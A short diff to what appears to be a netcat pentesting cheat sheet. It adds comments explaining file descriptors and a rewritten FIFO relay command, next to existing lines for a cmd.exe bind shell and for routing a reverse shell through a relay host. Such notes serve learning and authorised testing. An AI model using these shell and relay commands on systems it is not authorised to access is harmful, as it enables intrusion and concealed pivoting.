@@ -25,6 +25,9 @@ nc -l -p <tgtport> -e cmd.exe
 #relay ost
 mknod relay1 p #p - FIFO obj
 nc -l -p <relayport> 0<relay1 | nc <tgtip> <tgtport> 1>relay1
+#0 - optional, just used to denote that 0=stdin
+#1 - optional, 1=stdout
+nc -l -p <relayport> < relay1 | nc <tgtip> <tgtport> > relay1
 #originating client endpoint
 nc <relayip> <relayport>
 #routing reverse shell through relay host
